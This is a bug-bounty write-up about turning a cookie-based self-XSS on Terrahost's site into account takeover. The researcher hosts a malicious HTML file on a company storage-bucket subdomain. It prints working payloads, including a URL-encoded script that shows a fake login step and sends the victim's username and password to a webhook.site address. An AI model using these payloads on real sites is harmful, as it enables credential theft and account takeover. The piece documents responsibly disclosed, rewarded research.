---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-06_turning-cookie-based-xss-into-account-takeover.md
original_filename: 2022-09-06_turning-cookie-based-xss-into-account-takeover.md
title: Turning cookie based XSS into account takeover
category: documents
detected_topics:
- cloud-security
- idor
- xss
- command-injection
- rate-limit
- automation-abuse
tags:
- imported
- documents
- cloud-security
- idor
- xss
- command-injection
- rate-limit
- automation-abuse
language: en
raw_sha256: 674d8a016a822d7e671127b6f7a7af7c82cb4764aeb3c020186d0e951ecc14a1
text_sha256: 49f3fa7f3908ddd43be05b79bb2dc1e486ebfe337b3693e115fb1406db501941
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: true
---

# Turning cookie based XSS into account takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-06_turning-cookie-based-xss-into-account-takeover.md
- Source Type: markdown
- Detected Topics: cloud-security, idor, xss, command-injection, rate-limit, automation-abuse
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: True
- Raw SHA256: `674d8a016a822d7e671127b6f7a7af7c82cb4764aeb3c020186d0e951ecc14a1`
- Text SHA256: `49f3fa7f3908ddd43be05b79bb2dc1e486ebfe337b3693e115fb1406db501941`


## Content

---
title: "Turning cookie based XSS into account takeover"
page_title: "Turning cookie based XSS into account takeover - Bergee's Stories on Bug Hunting"
url: "https://bergee.it/blog/turning-cookie-based-xss-into-account-takeover/"
final_url: "https://bergee.it/blog/turning-cookie-based-xss-into-account-takeover/"
authors: ["Bartłomiej Bergier (@_bergee_)"]
programs: ["Terrahost"]
bugs: ["XSS", "Account takeover"]
bounty: "500"
publication_date: "2022-09-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2210
---

# Turning cookie based XSS into account takeover

Posted on [2022-09-062026-04-27](https://bergee.it/blog/turning-cookie-based-xss-into-account-takeover/) by [bergee](https://bergee.it/blog/author/bergee/)

### The cookie-based XSS

One evening I started hunting on the [Terrahost Bug Bounty program](https://terrahost.no/bug-bounty-program). I was testing the terrahost.no main domain. There was a functionality where I could choose the service, then register an account and place an order. So I did that. I chose Virtual Hosting and put all the data – username, address, phone number, postal code, etc. Clicked “Register” And I saw all the data displayed on the screen. Immediately thought of XSS and started looking at the requests in Burp. But found nothing. Refreshed the page and still saw the data. Then I looked into the local storage, session storage, and cookies. And voila! The data were stored inside the cookies.

![](https://bergee.it/blog/wp-content/uploads/2022/09/cookies_redacted.png)

I cleared all the cookies, used the developer console, and changed the value of the customer_name cookie value into the XSS payload:

> <img src=”x” onerror=alert(document.domain)>

Refreshed the page and saw nothing :(. The registration process for placing the order consists of two-step. The first step is where the registration form is displayed and the second step is when the customer’s data are displayed. We need the second step to execute the payload. I figured out that these steps are controlled by a cookie named “step” so I needed to set this cookie also to see the beautiful alert box :). Ok so far so good. But this is self-XSS which means I cannot attack anybody with this. The company does not accept self-XSS issues.

[![](https://bergee.it/blog/wp-content/uploads/2022/09/cookie_based_xss_2-1024x530.png)](https://bergee.it/blog/wp-content/uploads/2022/09/cookie_based_xss_2.png)

###### Click the image to enlarge

### Turning self xss into remote xss

I googled a bit and found out that cookie-based xss can be exploited and turned into good xss. The steps:

1\. I must set the same name as our vulnerable cookie “customer_name” on some subdomain of terrahost.no, ie. sub.terrahost.no this way:

> document.cookie=’customer_name=<img src=x onerror=alert(document.domain)>; domain=.terrahost.no’;

The dot at the beginning is important. This way despite the cookie being set by the subdomain, it is valid on the main terrahost.no domain.

2\. I must redirect the victim from the sub.terrahost.no to terrahost.no

Ok, how can I execute these steps? I came up with two ways:  
– sending cookie headers injected by CRLF vulnerabilities on the subdomain – haven’t tested this method yet  
– using some other XSS on the subdomain to set the cookie with javascript code

### The failures time

The first thing I did was subdomain enumeration of terrahost.no with the following tools: [subfinder](https://github.com/projectdiscovery/subfinder), [amass](https://github.com/OWASP/Amass), [findomain](https://github.com/Findomain/Findomain) and [assetfinder](https://github.com/tomnomnom/assetfinder). Then tried to find a CRLF header injection with [CRLFFuzz](https://github.com/dwisiswant0/crlfuzz). But failed – none of the subdomains was vulnerable. Now it was time to look for XSS. I found some apps protected by login screens, and some 404 pages, I was looking for CVEs , fuzzing the 404/403/302 endpoints, and found some more apps but I could not find any XSS anywhere :(. After about a week I gave up and decided to report the vulnerability as it is – cookie-based self-XSS. As I expected the team said it’s self xss so there is no threat here.

### VPS to the rescue… or not?

As this company offers VPSes, dedicated servers, etc., I thought what If I buy the cheapest VPS and then probably get the subdomain like myserver.terrahost.no, then set up the web server and put the payload there. So I did that and get the subdomain like… srvXXX.terrahost.com.  
Noooo! I needed the subdomain of terrahost.no. Anyway, the srvXXX.terrahost.com was just the hostname not visible outside. I played a bit with the VPS and looked for some other services hoping to get some subdomain.terrahost.no and link it somehow with the VPS. But failed again.  
I had a new shiny VPS with the static IP… Not what I expected. 🙁 Another failure.

### Terrahost’s object storage buckets

I gave up on this bug and started to hunt on the management panel at https://enigma.terrahost.com. What I suddenly noticed, one of Terrahost’s services is AWS S3-like object storage buckets. The bucket address is like… mybucket.s3.terrahost.no. I immediately created my bucket called berdzibucket. And now I had what I wanted – berdzibucket.s3.terrahost.no – the subdomain where I could put my files!!! The hard part here was to learn how to use the buckets. I spent some time trying to use AWS CLI tools. Finally contacted support and they told me I needed to use the [MinIO](https://github.com/minio/minio) tool to operate the buckets. I set up the tool, created the HTML file which set both cookies (step and customer_id) and redirects the victim to the main domain, put this on the s3 bucket, and set the policy to the public:

> $ minio cp poc_xss.html terra/berdzibucket  
>  $ minio policy set public terra/berdzibucket/poc_xss.html

The content of the files poc_xss.html was like this:

> <script type=”text/javascript”>  
>  document.cookie=’customer_id=<img src=x onerror=alert(document.domain)>;domain=.terrahost.no’;  
>  document.cookie=’step=2;domain=.terrahost.no’;  
>  window.location.href=”https://terrahost.no/bestilling?pid=3813″  
>  </script>

Where https://terrahost.no/bestilling?pid=3813 was the URL of the order page. So I had the URL like:

> https://berdzibucket.s3.terrahost.no/poc_xss.html

Clicking the URL redirected the victim to the main terrahost.no domain and the alert box popped up.

[![](https://bergee.it/blog/wp-content/uploads/2022/09/terra_poc_cookie_xss_short-1024x520.gif)](https://bergee.it/blog/wp-content/uploads/2022/09/terra_poc_cookie_xss_short.gif)

###### Click the image to play movie

### The real impact

Let’s remember what’s the most valuable for the company in terms of bug hunting – the real impact of the bug. The alert box is just the POC. Now I decided to steal all other cookies which hold the customer’s data. I changed the payload to alert(document.cookie) instead, uploaded the file on the bucket, logged in as the victim, clicked the link, and… nothing happened. Why? WTF? I used the customer_id cookie to store my XSS payload. When the victim is logged in, all the cookies holding the customer’s data are already set by the terrahost.no domain. Setting same name cookies by berdzibucket.s3.terrahost.no on .terrahost.no domain will work, however, the cookies from the main domain are taken into consideration first – so the value of customer_id cookie set by registration process is displayed, not the one set by my file on s3 bucket. This way all other cookies vulnerable to XSS are already set and I can’t put my payload there. So I could not steal registered customers’ data. 🙁 Anyway, the bug was valid as was not self-xss anymore. I reported this to the company. They told me – this is a valid bug but not exploitable. No bounty here :(.

### Trying harder

I almost gave up again. But the next day in the toilet 🙂 I asked myself – what If I used the XSS payload to steal the victim’s credentials while logging in. The account registration while placing the order consists of two steps

1\. Step one – both the login and register forms are visible on the screen

![](https://bergee.it/blog/wp-content/uploads/2022/09/step1.png)

2\. Step two – the customer’s data are visible on the screen

![](https://bergee.it/blog/wp-content/uploads/2022/09/step2_data_redacted.png)

We need step two to execute the payload, but the login form is visible only in step one. The step screen is controlled by the value of the cookie called step with values 1-4. We are interested in steps 1 and 2. Another obstacle to defeat. I looked at the DOM of the page and saw, that when step 2 is set, the login form is just hidden by the CSS display property and the customer data div is shown.

![](https://bergee.it/blog/wp-content/uploads/2022/09/steps_code.png)

So I need to manipulate the DOM to show the login form again and hide the customer’s data to make it look like step 1. The XSS payload will do the following things:

1\. Show the login form again  
2\. Hide the customer data div  
3\. Set the onClick event on the “Login” button – when the victim clicks the button the credentials are sent to the attacker’s server

So I created the following payload as the website uses jQuery:

> <img id=’imgx’><script>$(“.row_information”).hide(); $(“.step1”).show(); $(“.login”).click(function(e){un=$(“#username”).val(); pwd=***REDACTED***

Update: Now I can see I could just hide the step 2 and show step 1 🙂

I used <https://webhook.site> to create a webhook accepting the requests simulating the attacker’s server. I tried to send data with the XHR request first but the CORS blocked it. To bypass that I modified the payload to send the data via the <img src> tag. It worked. The victim’s credentials were sent to the attacker. These were the same credentials the victim uses to log into the enigma management panel. I created the place_order.html file and uploaded it on my s3 terrahost bucket. The place_order.html looked like this:

> <script type=”text/javascript”>  
>  document.cookie=’customer_id=%3Cimg%20id%3D%27imgx%27%3E%3Cscript%3E%24%28%22.row_information%22%29.hide%28%29%3B%20%24%28%22.step1%22%29.show%28%29%3B%20%24%28%22.login%22%29.click%28function%28e%29%7Bun%3D%24%28%22%23username%22%29.val%28%29%3B%20pwd%3D%24%28%22%23password%22%29.val%28%29%3Bimgx.src%3D%22https%3A%2F%2Fwebhook.site%2Fda65627b-61d4-446e-91fd-ada548c7975x%3Fdata%3D%22%2Bun%2B%27%2C%27%2Bpwd%7D%2%3B%3C%2Fscript%3E;domain=.terrahost.no’;document.cookie=’step=2;domain=.terrahost.no’;  
>  window.location.href=”https://terrahost.no/bestilling?pid=3813  
>  </script>

So these are the final steps to take over the victim’s account:  
1\. The victim gets the URL https://attackerbucket.s3.terrahost.no/place_order.html  
2\. The victim clicks the URL and is redirected to the login site – he/she sees nothing suspicious here  
3\. The XSS payload is set up and as soon as the victim logs in, the script sends the credentials to the attacker’s server  
4\. The attacker takes over the victim’s account

[![](https://bergee.it/blog/wp-content/uploads/2022/09/terra_poc_xss_ato_short-1-1024x545.gif)](https://bergee.it/blog/wp-content/uploads/2022/09/terra_poc_xss_ato_short-1.gif)

###### Click the image to play movie

### Epilogue

I reported the exploitation scenario and was rewarded €500, as the impact was high. Be patient, don’t give up, and think out of the box. In this case, I used the company’s service to exploit the bug.

Reward: €500

Take care, see you next bug 🙂
